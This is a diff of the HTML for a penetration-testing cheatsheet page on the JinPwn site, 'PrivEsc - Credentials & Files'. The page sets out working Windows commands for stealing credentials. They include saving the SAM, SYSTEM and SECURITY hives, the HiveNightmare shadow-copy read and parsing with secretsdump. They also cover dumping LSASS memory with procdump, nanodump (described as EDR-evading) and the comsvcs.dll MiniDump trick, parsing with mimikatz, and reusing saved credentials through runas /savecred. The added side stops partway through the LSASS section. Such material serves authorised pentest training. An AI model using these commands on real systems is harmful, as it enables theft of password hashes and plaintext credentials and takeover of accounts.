@@ -1,541 +1,124 @@
-<!DOCTYPE html>
-<html lang="en-US" dir="ltr" class="">
-<head>
-  <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>PrivEsc - Credentials &amp; Files | JinPwn</title><meta name="description" content="Credentials lying on the box. The most reliable Windows privesc when the privileges and services come up clean.">
-<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
-<meta name="googlebot" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
-
-<link rel="canonical" href="https://jinpwn.dev/cheatsheets/windows/w06-privesc---credentials--files/">
-<meta property="og:title" content="PrivEsc - Credentials &amp; Files | JinPwn">
-<meta property="og:description" content="Credentials lying on the box. The most reliable Windows privesc when the privileges and services come up clean.">
-<meta property="og:type" content="website">
-<meta property="og:url" content="https://jinpwn.dev/cheatsheets/windows/w06-privesc---credentials--files/">
-<meta property="og:site_name" content="JinPwn">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://jinpwn.dev/images/og/og.png">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="PrivEsc - Credentials &amp; Files | JinPwn">
-<meta name="twitter:description" content="Credentials lying on the box. The most reliable Windows privesc when the privileges and services come up clean.">
-<meta name="twitter:image" content="https://jinpwn.dev/images/og/og.png">
-<meta name="twitter:site" content="@jinpwn">
-<meta name="twitter:creator" content="@jinpwn">
-
-
-<script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","description":"Credentials lying on the box. The most reliable Windows privesc when the privileges and services come up clean.","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"PrivEsc - Credentials \u0026 Files | JinPwn","url":"https://jinpwn.dev/cheatsheets/windows/w06-privesc---credentials--files/"}</script>
-
-<meta name="theme-color" content="#111111">
-<link rel="icon" type="image/png" href="/favicon.png">
-
-      <link rel="stylesheet" href="/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css" integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin="anonymous">
-
-
-        <script src="/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js" integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin="anonymous" defer></script>
-        <script src="/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js" integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin="anonymous" defer></script>
-
-
-</head>
-<body class="">
-  
-
-
-
-
-
-  
-  
-  
-
-
-
-  
-
-<header class="site-header">
-  <nav class="top-nav">
-    <div class="container nav-inner">
-      <div class="nav-left">
-        <a href="/" class="brand-link has-logo" aria-label="Home"><img src="/favicon.png" alt="jinpwn.dev" class="brand-logo" style="--brand-logo-height: 36px;"></a>
-        <div class="nav-links desktop-only">
-          
-    <a href="/">Posts</a>
-    <a href="/posts/">Archive</a>
-    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
-    <a href="/about/">About</a>
-
-        </div>
-      </div>
-      <div class="nav-actions">
-        <div class="search-anchor" id="search-root" data-search-root>
-          <label class="search-trigger" for="search-input">
-            <span class="search-glyph" aria-hidden="true">
-              <svg viewBox="0 0 24 24">
-                <circle cx="11" cy="11" r="7"></circle>
-                <path d="M20 20L16.65 16.65"></path>
-              </svg>
-            </span>
-            <input id="search-input" type="search" placeholder="Search..." autocomplete="off" spellcheck="false" aria-label="Search posts and cheatsheets">
-            <button type="button" class="search-clear" data-search-clear aria-label="Clear search" hidden>
-              <svg viewBox="0 0 24 24" aria-hidden="true">
-                <path d="M18 6L6 18"></path>
-                <path d="M6 6l12 12"></path>
-              </svg>
-            </button>
-            <span class="search-trigger-shortcut desktop-only" aria-hidden="true">CTRL K</span>
-          </label>
-          <div id="search-dropdown" class="search-dropdown" hidden data-search-index-url="/search-index.json" data-search-runtime-url="/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js">
-  <p class="search-status" data-search-status aria-live="polite">Type to search posts and cheatsheets.</p>
-  <div class="search-results" data-search-results role="listbox" aria-label="Search results">
-    <p class="search-empty">Type to search posts and cheatsheets.</p>
-  </div>
-</div>
-
-        </div>
-        <button class="icon-button mobile-only" type="button" data-search-mobile-toggle aria-label="Search" aria-expanded="false" aria-controls="search-root">
-          <svg viewBox="0 0 24 24" aria-hidden="true">
-            <circle cx="11" cy="11" r="7"></circle>
-            <path d="M20 20L16.65 16.65"></path>
-          </svg>
-        </button>
-        <button class="icon-button mobile-only" type="button" data-mobile-toggle aria-label="Toggle menu" aria-expanded="false" aria-controls="mobile-nav">
-          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon>
-            <path d="M3 6h18"></path>
-            <path d="M3 12h18"></path>
-            <path d="M3 18h18"></path>
-          </svg>
-          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon hidden>
-            <path d="M18 6L6 18"></path>
-            <path d="M6 6l12 12"></path>
-          </svg>
-        </button>
-      </div>
-    </div>
-    <div id="mobile-nav" class="mobile-nav">
-      
-    <a href="/">Posts</a>
-    <a href="/posts/">Archive</a>
-    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
-    <a href="/about/">About</a>
-
-    </div>
-  </nav>
-</header>
-
-  
-  <main class="site-main">
-    
-  
-  
-  
-  <article class="container cheatsheet-docs-shell">
-    <div class="cheatsheet-docs-layout">
-      
-        <aside class="cheatsheet-sidebar" aria-label="Windows Pentesting navigation">
-    <div class="cheatsheet-sidebar-inner">
-      
-        <a href="/cheatsheets/" class="cheatsheet-sidebar-root">All cheatsheets</a>
-      
-      <a href="/cheatsheets/windows/" class="cheatsheet-sidebar-section">Windows Pentesting</a>
-      
-        <nav class="cheatsheet-sidebar-nav">
-          <ul class="cheatsheet-sidebar-list">
-            
-              <li>
-                <a href="/cheatsheets/windows/00-windows-moc/" class="cheatsheet-sidebar-link">Windows MOC</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/windows/w01-recon--enum/" class="cheatsheet-sidebar-link">Recon &amp; Enum</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/windows/w02-local-enum/" class="cheatsheet-sidebar-link">Local Enum</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/windows/w03-privesc---tokens--privileges/" class="cheatsheet-sidebar-link">PrivEsc - Tokens &amp; Privileges</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/windows/w04-privesc---services--registry/" class="cheatsheet-sidebar-link">PrivEsc - Services &amp; Registry</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/windows/w05-privesc---dll--unquoted-paths/" class="cheatsheet-sidebar-link">PrivEsc - DLL &amp; Unquoted Paths</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/windows/w06-privesc---credentials--files/" class="cheatsheet-sidebar-link is-current">PrivEsc - Credentials &amp; Files</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/windows/w07-uac-bypass/" class="cheatsheet-sidebar-link">UAC Bypass</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/windows/w08-privesc---kernel--exploits/" class="cheatsheet-sidebar-link">PrivEsc - Kernel &amp; Exploits</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/windows/w09-lolbas/" class="cheatsheet-sidebar-link">LOLBAS</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/windows/w10-defender--amsi-evasion/" class="cheatsheet-sidebar-link">Defender &amp; AMSI Evasion</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/windows/w11-lateral-movement/" class="cheatsheet-sidebar-link">Lateral Movement</a>
-              </li>
-            
-          </ul>
-        </nav>
-      
-    </div>
-  </aside>
-      
-      <div class="cheatsheet-docs-main cheatsheet-page-main">
-        <header class="cheatsheet-page-header">
-          <h1>PrivEsc - Credentials &amp; Files</h1>
-          
-        </header>
-
-        
-          <details class="cheatsheet-mobile-sections">
-    <summary class="cheatsheet-mobile-sections-summary">
-      <span class="cheatsheet-mobile-sections-label">Sections</span>
-      <span class="cheatsheet-mobile-sections-current">PrivEsc - Credentials &amp; Files</span>
-      <span class="cheatsheet-mobile-sections-caret" aria-hidden="true"></span>
-    </summary>
-    <div class="cheatsheet-mobile-sections-panel">
-      <nav aria-label="Windows Pentesting sections">
-        <ul class="cheatsheet-mobile-sections-list">
-          
-            <li>
-              <a href="/cheatsheets/" class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a>
-            </li>
-          
-          <li>
-            <a href="/cheatsheets/windows/" class="cheatsheet-mobile-sections-link">Overview</a>
-          </li>
-          
-            <li>
-              <a href="/cheatsheets/windows/00-windows-moc/" class="cheatsheet-mobile-sections-link">Windows MOC</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/windows/w01-recon--enum/" class="cheatsheet-mobile-sections-link">Recon &amp; Enum</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/windows/w02-local-enum/" class="cheatsheet-mobile-sections-link">Local Enum</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/windows/w03-privesc---tokens--privileges/" class="cheatsheet-mobile-sections-link">PrivEsc - Tokens &amp; Privileges</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/windows/w04-privesc---services--registry/" class="cheatsheet-mobile-sections-link">PrivEsc - Services &amp; Registry</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/windows/w05-privesc---dll--unquoted-paths/" class="cheatsheet-mobile-sections-link">PrivEsc - DLL &amp; Unquoted Paths</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/windows/w06-privesc---credentials--files/" class="cheatsheet-mobile-sections-link is-current">PrivEsc - Credentials &amp; Files</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/windows/w07-uac-bypass/" class="cheatsheet-mobile-sections-link">UAC Bypass</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/windows/w08-privesc---kernel--exploits/" class="cheatsheet-mobile-sections-link">PrivEsc - Kernel &amp; Exploits</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/windows/w09-lolbas/" class="cheatsheet-mobile-sections-link">LOLBAS</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/windows/w10-defender--amsi-evasion/" class="cheatsheet-mobile-sections-link">Defender &amp; AMSI Evasion</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/windows/w11-lateral-movement/" class="cheatsheet-mobile-sections-link">Lateral Movement</a>
-            </li>
-          
-        </ul>
-      </nav>
-    </div>
-  </details>
-        
-
-        <div class="markdown-content cheatsheet-page-body">
-          <p>Credentials lying on the box. The most reliable Windows privesc when the privileges and services come up clean.</p>
-<h2 id="i-sam-system-security-hives" data-heading-permalink="true"><span class="heading-content">i. SAM, SYSTEM, SECURITY hives</span>
-    <a class="heading-permalink" href="#i-sam-system-security-hives" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Locked while Windows is running. Need SeBackup, admin, or HiveNightmare (CVE-2021-36934).</p>
-<p>With SeBackupPrivilege (covered in <a href="https://jinpwn.dev/cheatsheets/windows/w03-privesc---tokens--privileges/">PrivEsc - Tokens &amp; Privileges</a>
-):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">reg save HKLM\SAM C:\Windows\Temp\SAM
-</span></span><span class="line"><span class="cl">reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
-</span></span><span class="line"><span class="cl">reg save HKLM\SECURITY C:\Windows\Temp\SECURITY
-</span></span></code></pre></div><p>HiveNightmare (any non-admin, Win10 1809+ to early 2021 patch):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">icacls C:\Windows\System32\config\SAM
-</span></span><span class="line"><span class="cl">## If <span class="s2">&#34;BUILTIN\Users:(I)(RX)&#34;</span> is shown, every user has read on SAM
-</span></span><span class="line"><span class="cl">## Read from Volume Shadow Copies:
-</span></span><span class="line"><span class="cl"><span class="k">mklink</span> /D C:\Temp\vss \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
-</span></span><span class="line"><span class="cl"><span class="k">copy</span> C:\Temp\vss\Windows\System32\config\SAM C:\Windows\Temp\
-</span></span><span class="line"><span class="cl"><span class="k">copy</span> C:\Temp\vss\Windows\System32\config\SYSTEM C:\Windows\Temp\
-</span></span><span class="line"><span class="cl"><span class="k">copy</span> C:\Temp\vss\Windows\System32\config\SECURITY C:\Windows\Temp\
-</span></span></code></pre></div><p>Parse on attacker:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
-</span></span></code></pre></div><p>Output gives you local Administrator NTLM (use for PtH, see <a href="https://jinpwn.dev/cheatsheets/windows/w11-lateral-movement/">Lateral Movement</a>
-) and any cached domain creds.</p>
-<h2 id="ii-lsass-dump" data-heading-permalink="true"><span class="heading-content">ii. LSASS dump</span>
-    <a class="heading-permalink" href="#ii-lsass-dump" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>All currently-logged-in users&rsquo; creds, in plaintext or NTLM. Needs SeDebug or admin.</p>
-<p>procdump (Microsoft-signed, often not flagged):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
-</span></span></code></pre></div><p>nanodump (designed for EDR evasion):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">nanodump.exe --write C:\Windows\Temp\lsass.dmp
-</span></span></code></pre></div><p>Comsvcs.dll trick (no external binary needed):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$id</span> <span class="p">=</span> <span class="p">(</span><span class="nb">Get-Process</span> <span class="n">lsass</span><span class="p">).</span><span class="py">Id</span>
-</span></span><span class="line"><span class="cl"><span class="n">rundll32</span><span class="p">.</span><span class="py">exe</span> <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">comsvcs</span><span class="p">.</span><span class="n">dll</span><span class="p">,</span> <span class="n">MiniDump</span> <span class="nv">$id</span> <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">lsass</span><span class="p">.</span><span class="py">dmp</span> <span class="n">full</span>
-</span></span></code></pre></div><p>Or Task Manager GUI: Details -&gt; right-click lsass.exe -&gt; Create dump file.</p>
-<p>Parse on attacker:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-pypykatz lsa minidump lsass.dmp
-</span></span><span class="line"><span class="cl"><span class="c1">## or</span>
-</span></span><span class="line"><span class="cl">mimikatz.exe
-</span></span><span class="line"><span class="cl">sekurlsa::minidump lsass.dmp
-</span></span><span class="line"><span class="cl">sekurlsa::logonpasswords
-</span></span></code></pre></div><div class="obsidian-callout callout-warning">
-  <div class="obsidian-callout-header">
-    <div class="obsidian-callout-icon" aria-hidden="true">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"></path>
-          <path d="M12 9v4"></path>
-          <path d="M12 17h.01"></path></svg>
-    </div>
-    <span class="obsidian-callout-title">LSA Protection</span>
-  </div>
-  <div class="obsidian-callout-body">
-    <p>Modern Windows (Server 2019+, Win10 with PPL enabled) protects LSASS with PPL. Standard procdump fails. Use PPLdump or PPLBlade to bypass.</p>
-  </div>
-</div>
-<h2 id="iii-windows-credential-manager--vault" data-heading-permalink="true"><span class="heading-content">iii. Windows Credential Manager / Vault</span>
-    <a class="heading-permalink" href="#iii-windows-credential-manager--vault" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Saved RDP creds, web creds, Windows logins:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">cmdkey /list
-</span></span></code></pre></div><p>Use them with runas without seeing the password:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">runas /savecred /user:DOMAIN\Administrator <span class="s2">&#34;C:\Windows\Temp\sh.exe&#34;</span>
-</span></span></code></pre></div><p>Dump cleartext via Mimikatz:</p>
-<pre tabindex="0"><code>mimikatz.exe
+<!doctype html><html lang=en-US dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>PrivEsc - Credentials & Files | JinPwn</title><meta name=description content="Credentials lying on the box. The most reliable Windows privesc when the privileges and services come up clean."><meta name=robots content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1"><meta name=googlebot content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1"><link rel=canonical href=https://jinpwn.dev/cheatsheets/windows/w06-privesc---credentials--files/><meta property="og:title" content="PrivEsc - Credentials & Files | JinPwn"><meta property="og:description" content="Credentials lying on the box. The most reliable Windows privesc when the privileges and services come up clean."><meta property="og:type" content="website"><meta property="og:url" content="https://jinpwn.dev/cheatsheets/windows/w06-privesc---credentials--files/"><meta property="og:site_name" content="JinPwn"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://jinpwn.dev/images/og/og.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="PrivEsc - Credentials & Files | JinPwn"><meta name=twitter:description content="Credentials lying on the box. The most reliable Windows privesc when the privileges and services come up clean."><meta name=twitter:image content="https://jinpwn.dev/images/og/og.png"><meta name=twitter:site content="@jinpwn"><meta name=twitter:creator content="@jinpwn"><script type=application/ld+json>{"@context":"https://schema.org","@type":"WebPage","description":"Credentials lying on the box. The most reliable Windows privesc when the privileges and services come up clean.","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"PrivEsc - Credentials \u0026 Files | JinPwn","url":"https://jinpwn.dev/cheatsheets/windows/w06-privesc---credentials--files/"}</script><meta name=theme-color content="#111111"><link rel=icon type=image/png href=/favicon.png><link rel=stylesheet href=/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin=anonymous><script src=/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin=anonymous defer></script><script src=/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin=anonymous defer></script></head><body><header class=site-header><nav class=top-nav><div class="container nav-inner"><div class=nav-left><a href=/ class="brand-link has-logo" aria-label=Home><img src=/favicon.png alt=jinpwn.dev class=brand-logo style=--brand-logo-height:36px></a><div class="nav-links desktop-only"><a href=/>Posts</a>
+<a href=/posts/>Archive</a>
+<a href=/cheatsheets/ class=is-current>Cheatsheets</a>
+<a href=/about/>About</a></div></div><div class=nav-actions><div class=search-anchor id=search-root data-search-root><label class=search-trigger for=search-input><span class=search-glyph aria-hidden=true><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.35-3.35"/></svg>
+</span><input id=search-input type=search placeholder=Search... autocomplete=off spellcheck=false aria-label="Search posts and cheatsheets">
+<button type=button class=search-clear data-search-clear aria-label="Clear search" hidden>
+<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg>
+</button>
+<span class="search-trigger-shortcut desktop-only" aria-hidden=true>CTRL K</span></label><div id=search-dropdown class=search-dropdown hidden data-search-index-url=/search-index.json data-search-runtime-url=/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js><p class=search-status data-search-status aria-live=polite>Type to search posts and cheatsheets.</p><div class=search-results data-search-results role=listbox aria-label="Search results"><p class=search-empty>Type to search posts and cheatsheets.</p></div></div></div><button class="icon-button mobile-only" type=button data-search-mobile-toggle aria-label=Search aria-expanded=false aria-controls=search-root>
+<svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.35-3.35"/></svg>
+</button>
+<button class="icon-button mobile-only" type=button data-mobile-toggle aria-label="Toggle menu" aria-expanded=false aria-controls=mobile-nav>
+<svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon=""><path d="M3 6h18"/><path d="M3 12h18"/><path d="M3 18h18"/></svg>
+<svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon="" hidden=""><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div></div><div id=mobile-nav class=mobile-nav><a href=/>Posts</a>
+<a href=/posts/>Archive</a>
+<a href=/cheatsheets/ class=is-current>Cheatsheets</a>
+<a href=/about/>About</a></div></nav></header><main class=site-main><article class="container cheatsheet-docs-shell"><div class=cheatsheet-docs-layout><aside class=cheatsheet-sidebar aria-label="Windows Pentesting navigation"><div class=cheatsheet-sidebar-inner><a href=/cheatsheets/ class=cheatsheet-sidebar-root>All cheatsheets</a>
+<a href=/cheatsheets/windows/ class=cheatsheet-sidebar-section>Windows Pentesting</a><nav class=cheatsheet-sidebar-nav><ul class=cheatsheet-sidebar-list><li><a href=/cheatsheets/windows/00-windows-moc/ class=cheatsheet-sidebar-link>Windows MOC</a></li><li><a href=/cheatsheets/windows/w01-recon--enum/ class=cheatsheet-sidebar-link>Recon & Enum</a></li><li><a href=/cheatsheets/windows/w02-local-enum/ class=cheatsheet-sidebar-link>Local Enum</a></li><li><a href=/cheatsheets/windows/w03-privesc---tokens--privileges/ class=cheatsheet-sidebar-link>PrivEsc - Tokens & Privileges</a></li><li><a href=/cheatsheets/windows/w04-privesc---services--registry/ class=cheatsheet-sidebar-link>PrivEsc - Services & Registry</a></li><li><a href=/cheatsheets/windows/w05-privesc---dll--unquoted-paths/ class=cheatsheet-sidebar-link>PrivEsc - DLL & Unquoted Paths</a></li><li><a href=/cheatsheets/windows/w06-privesc---credentials--files/ class="cheatsheet-sidebar-link is-current">PrivEsc - Credentials & Files</a></li><li><a href=/cheatsheets/windows/w07-uac-bypass/ class=cheatsheet-sidebar-link>UAC Bypass</a></li><li><a href=/cheatsheets/windows/w08-privesc---kernel--exploits/ class=cheatsheet-sidebar-link>PrivEsc - Kernel & Exploits</a></li><li><a href=/cheatsheets/windows/w09-lolbas/ class=cheatsheet-sidebar-link>LOLBAS</a></li><li><a href=/cheatsheets/windows/w10-defender--amsi-evasion/ class=cheatsheet-sidebar-link>Defender & AMSI Evasion</a></li><li><a href=/cheatsheets/windows/w11-lateral-movement/ class=cheatsheet-sidebar-link>Lateral Movement</a></li></ul></nav></div></aside><div class="cheatsheet-docs-main cheatsheet-page-main"><header class=cheatsheet-page-header><h1>PrivEsc - Credentials & Files</h1></header><details class=cheatsheet-mobile-sections><summary class=cheatsheet-mobile-sections-summary><span class=cheatsheet-mobile-sections-label>Sections</span>
+<span class=cheatsheet-mobile-sections-current>PrivEsc - Credentials & Files</span>
+<span class=cheatsheet-mobile-sections-caret aria-hidden=true></span></summary><div class=cheatsheet-mobile-sections-panel><nav aria-label="Windows Pentesting sections"><ul class=cheatsheet-mobile-sections-list><li><a href=/cheatsheets/ class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a></li><li><a href=/cheatsheets/windows/ class=cheatsheet-mobile-sections-link>Overview</a></li><li><a href=/cheatsheets/windows/00-windows-moc/ class=cheatsheet-mobile-sections-link>Windows MOC</a></li><li><a href=/cheatsheets/windows/w01-recon--enum/ class=cheatsheet-mobile-sections-link>Recon & Enum</a></li><li><a href=/cheatsheets/windows/w02-local-enum/ class=cheatsheet-mobile-sections-link>Local Enum</a></li><li><a href=/cheatsheets/windows/w03-privesc---tokens--privileges/ class=cheatsheet-mobile-sections-link>PrivEsc - Tokens & Privileges</a></li><li><a href=/cheatsheets/windows/w04-privesc---services--registry/ class=cheatsheet-mobile-sections-link>PrivEsc - Services & Registry</a></li><li><a href=/cheatsheets/windows/w05-privesc---dll--unquoted-paths/ class=cheatsheet-mobile-sections-link>PrivEsc - DLL & Unquoted Paths</a></li><li><a href=/cheatsheets/windows/w06-privesc---credentials--files/ class="cheatsheet-mobile-sections-link is-current">PrivEsc - Credentials & Files</a></li><li><a href=/cheatsheets/windows/w07-uac-bypass/ class=cheatsheet-mobile-sections-link>UAC Bypass</a></li><li><a href=/cheatsheets/windows/w08-privesc---kernel--exploits/ class=cheatsheet-mobile-sections-link>PrivEsc - Kernel & Exploits</a></li><li><a href=/cheatsheets/windows/w09-lolbas/ class=cheatsheet-mobile-sections-link>LOLBAS</a></li><li><a href=/cheatsheets/windows/w10-defender--amsi-evasion/ class=cheatsheet-mobile-sections-link>Defender & AMSI Evasion</a></li><li><a href=/cheatsheets/windows/w11-lateral-movement/ class=cheatsheet-mobile-sections-link>Lateral Movement</a></li></ul></nav></div></details><div class="markdown-content cheatsheet-page-body"><p>Credentials lying on the box. The most reliable Windows privesc when the privileges and services come up clean.</p><h2 id=i-sam-system-security-hives data-heading-permalink=true><span class=heading-content>i. SAM, SYSTEM, SECURITY hives</span>
+<a class=heading-permalink href=#i-sam-system-security-hives aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Locked while Windows is running. Need SeBackup, admin, or HiveNightmare (CVE-2021-36934).</p><p>With SeBackupPrivilege (covered in <a href=https://jinpwn.dev/cheatsheets/windows/w03-privesc---tokens--privileges/>PrivEsc - Tokens & Privileges</a>
+):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>reg save HKLM\SAM C:\Windows\Temp\SAM
+</span></span><span class=line><span class=cl>reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
+</span></span><span class=line><span class=cl>reg save HKLM\SECURITY C:\Windows\Temp\SECURITY
+</span></span></code></pre></div><p>HiveNightmare (any non-admin, Win10 1809+ to early 2021 patch):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>icacls C:\Windows\System32\config\SAM
+</span></span><span class=line><span class=cl>## If <span class=s2>&#34;BUILTIN\Users:(I)(RX)&#34;</span> is shown, every user has read on SAM
+</span></span><span class=line><span class=cl>## Read from Volume Shadow Copies:
+</span></span><span class=line><span class=cl><span class=k>mklink</span> /D C:\Temp\vss \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
+</span></span><span class=line><span class=cl><span class=k>copy</span> C:\Temp\vss\Windows\System32\config\SAM C:\Windows\Temp\
+</span></span><span class=line><span class=cl><span class=k>copy</span> C:\Temp\vss\Windows\System32\config\SYSTEM C:\Windows\Temp\
+</span></span><span class=line><span class=cl><span class=k>copy</span> C:\Temp\vss\Windows\System32\config\SECURITY C:\Windows\Temp\
+</span></span></code></pre></div><p>Parse on attacker:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
+</span></span></code></pre></div><p>Output gives you local Administrator NTLM (use for PtH, see <a href=https://jinpwn.dev/cheatsheets/windows/w11-lateral-movement/>Lateral Movement</a>
+) and any cached domain creds.</p><h2 id=ii-lsass-dump data-heading-permalink=true><span class=heading-content>ii. LSASS dump</span>
+<a class=heading-permalink href=#ii-lsass-dump aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>All currently-logged-in users&rsquo; creds, in plaintext or NTLM. Needs SeDebug or admin.</p><p>procdump (Microsoft-signed, often not flagged):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
+</span></span></code></pre></div><p>nanodump (designed for EDR evasion):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>nanodump.exe --write C:\Windows\Temp\lsass.dmp
+</span></span></code></pre></div><p>Comsvcs.dll trick (no external binary needed):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nv>$id</span> <span class=p>=</span> <span class=p>(</span><span class=nb>Get-Process</span> <span class=n>lsass</span><span class=p>).</span><span class=py>Id</span>
+</span></span><span class=line><span class=cl><span class=n>rundll32</span><span class=p>.</span><span class=py>exe</span> <span class=n>C:</span><span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>System32</span><span class=p>\</span><span class=n>comsvcs</span><span class=p>.</span><span class=n>dll</span><span class=p>,</span> <span class=n>MiniDump</span> <span class=nv>$id</span> <span class=n>C:</span><span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>Temp</span><span class=p>\</span><span class=n>lsass</span><span class=p>.</span><span class=py>dmp</span> <span class=n>full</span>
